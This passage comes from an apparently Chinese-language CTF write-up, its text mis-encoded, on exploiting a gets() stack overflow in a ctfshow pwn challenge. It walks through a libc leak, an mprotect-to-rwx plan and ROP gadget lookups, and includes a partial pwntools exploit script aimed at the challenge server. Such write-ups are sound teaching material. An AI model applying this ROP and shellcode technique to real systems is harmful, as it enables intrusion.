&lt;p&gt;è¿™é‡Œå«æˆ‘ä»¬å¯åŠ¨Ubuntu 18ï¼Œå°±ctfshowé…ç»™æˆ‘ä»¬çš„ï¼Œé‚£æˆ‘ä»¬å°±å¬åŠç”¨å®ƒçš„è™šæ‹Ÿæœºã€‚è™½è¯´æ¯”è¾ƒè€&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160.png&#34;
	width=&#34;676&#34;
	height=&#34;209&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160_hu_bd2a78b1036eb8c2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160_hu_e3f01219916f9207.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;checksec&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;323&#34;
		data-flex-basis=&#34;776px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowã€mainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161.png&#34;
	width=&#34;684&#34;
	height=&#34;179&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161_hu_a971b4f57d92d856.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161_hu_265d4964c1ecede1.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;382&#34;
		data-flex-basis=&#34;917px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162.png&#34;
	width=&#34;910&#34;
	height=&#34;175&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162_hu_8b989b1353770219.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162_hu_8ac0967a3730fdae.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;520&#34;
		data-flex-basis=&#34;1248px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ˜æ˜¾çœ‹åˆ°&lt;code&gt;å±é™©çš„getså‡½æ•°&lt;/code&gt;ï¼Œctfshowå‡½æ•°è¿™æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼š&lt;/p&gt;
&lt;p&gt;ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼ˆ4æ­¥payloadï¼‰ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ³„æ¼å†…å­˜åœ°å€,é€šè¿‡è®¡ç®—å¾—åˆ°libcåœ°å€&lt;/li&gt;
&lt;li&gt;é€šè¿‡mprotectå‡½æ•°æ¥ä¿®æ”¹ä¸€æ®µåŒºåŸŸçš„æƒé™ï¼Œä½rwx&lt;/li&gt;
&lt;li&gt;å‘è¿™æ®µåŒºåŸŸå†™å…¥shellcode&lt;/li&gt;
&lt;li&gt;è·³è½¬åˆ°å†™å…¥shellcodeçš„åŒºåŸŸï¼Œå¹¶æ‰§è¡Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æˆ‘ä»¬è¦åˆ©ç”¨mprotectå‡½æ•°æ”¹å˜å†…å­˜æ‰§è¡Œæƒé™ï¼Œé‚£æˆ‘ä»¬éœ€è¦æ‰¾åœ°å€ï¼Œæ­£å¥½è¿™æ¬¡å’Œä¸Šæ¬¡ä¸€æ ·ä¸æ˜¯é¡µå¯¹é½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163.png&#34;
	width=&#34;1120&#34;
	height=&#34;564&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163_hu_e33d9ccea361e8ae.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163_hu_e154328f1e16809f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;198&#34;
		data-flex-basis=&#34;476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;bss_start_address = 0x602000&lt;/p&gt;
&lt;p&gt;64ä½ç¨‹åºé å¯„å­˜å™¨ä¼ å‚ï¼Œç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢ç¨‹åºæœ¬èº«çš„gadgetï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164.png&#34;
	width=&#34;1105&#34;
	height=&#34;469&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164_hu_54c58ffaf5f7ac8c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164_hu_19fc98944930584e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;235&#34;
		data-flex-basis=&#34;565px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;pop_rdi_ret = 0x00000000004007e3&lt;/p&gt;
&lt;p&gt;ç”¨ROPgadgetå‘½ä»¤æŸ¥libcåº“çš„é€šç”¨gadgetï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165.png&#34;
	width=&#34;1590&#34;
	height=&#34;293&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165_hu_d11a96159544a496.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165_hu_895ab54d666f15f6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;542&#34;
		data-flex-basis=&#34;1302px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;pop_rdx_ret1 = 0x0000000000001b96&lt;/p&gt;
&lt;p&gt;pop_rsi_ret1 = 0x0000000000023a6a&lt;/p&gt;
&lt;p&gt;å‰é¢åŠ ä¸ª1æ˜¯å› ä¸ºï¼Œåç»­è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„gadgetå˜é‡ï¼Œå¥½åŒºåˆ†ä¸€äº›ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªgadgetå¯ä»¥ä»ç¨‹åºæœ¬èº«å»æŸ¥åˆ°ï¼Œè€Œç¬¬äºŒä¸‰ä¸ªgadgetåœ°å€å´è¦åœ¨libcåº“è·å–ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166.png&#34;
	width=&#34;1235&#34;
	height=&#34;85&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166_hu_3325de85d6270528.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166_hu_855601e05de87156.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æŸ¥è¯¢ä¸åˆ°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1452&#34;
		data-flex-basis=&#34;3487px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™å¯ä»¥çœ‹åˆ°ç¨‹åºæœ¬èº«æ˜¯ä¸å¸¦ç¬¬äºŒã€ä¸‰ä¸ªçš„gadgetçš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦åˆ©ç”¨æ¼æ´å»è·å–flagï¼Œè€Œæœ¬èº«ç¨‹åºè¿è¡Œæ˜¯ä¸ç”¨åé¢ä¿©çš„gadgetçš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;expï¼›&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28281&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctfshow&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00000000004007e3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000001b96&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000023a6a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bss_start_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x602000&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# å†…å­˜é¡µå¯¹é½åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x7&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# PROT_READ | PROT_WRITE | PROT_EXEC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¡®ä¿shellcodeåœ°å€æ‰€åœ¨é¡µä¸bss_start_addressåŒé¡µï¼ˆæˆ–è°ƒæ•´mprotectèŒƒå›´ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x602000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é˜¶æ®µ1ï¼šæ³„éœ²libcåœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello CTFshow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;leak_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leak_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
